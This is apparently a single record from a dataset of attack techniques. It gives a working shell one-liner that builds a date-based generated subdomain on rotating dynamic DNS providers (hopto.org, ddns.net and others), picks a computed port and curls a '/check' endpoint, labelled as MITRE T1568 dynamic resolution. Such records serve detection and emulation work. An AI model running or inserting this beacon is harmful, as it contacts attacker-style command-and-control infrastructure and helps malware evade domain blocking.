command: s=$(date -u +%G%V%u); sub=$(echo -n "$s" | md5sum | cut -c1-14); providers=(hopto.org sytes.net zapto.org ddns.net); dom="$sub.${providers[$(($(date -u +%u)%${#providers[@]}))]}"; port=$(( 49152 + ($(date -u +%M) * 13 % 16383) )); curl --connect-timeout 6 "https://$dom:$port/check"
explanation: Uses ISO week/day to drive a DGA label and rotates among different dynamic DNS providers with a computed high-ephemeral port. This leverages dynamic DNS resolution per T1568.
rationale_steps: Build a weekly seed and hash to generate the subdomain.
Rotate provider domain based on day of week.
Choose a high ephemeral port from a formula.
Connect via curl to the dynamic domain and port.
